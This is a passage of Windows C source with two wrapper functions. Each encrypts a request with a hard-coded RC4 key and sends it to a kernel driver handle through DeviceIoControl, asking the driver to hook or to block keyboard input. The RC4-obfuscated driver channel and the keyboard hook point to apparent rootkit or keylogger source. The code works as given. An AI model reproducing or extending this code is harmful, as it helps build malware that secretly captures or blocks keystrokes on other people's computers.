    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_KEYB_HOOK, NULL, 0, pFilePacket, sizeof(file_packet_t), &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
        }
        else {
            ret = ZFS_KEYBBLOCK | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int __stdcall userio_keyboard_block(int isBlock)
{
    DWORD dwResult;
    pfile_packet_t pFilePacket;
    int ret = ZFS_KEYBBLOCK | ZFS_ERR_DEVIO_FAILED;

    if (zfs_prepare_request_data(&pFilePacket, MAX_PATH - 1, userio_keyb_block_id) == NULL) {
        return ZFS_KEYBBLOCK | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    pFilePacket->param1 = (uint32_t)isBlock;

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_KEYB_BLOCK, NULL, 0, pFilePacket, sizeof(file_packet_t), &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
        }
        else {
            ret = ZFS_KEYBBLOCK | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}
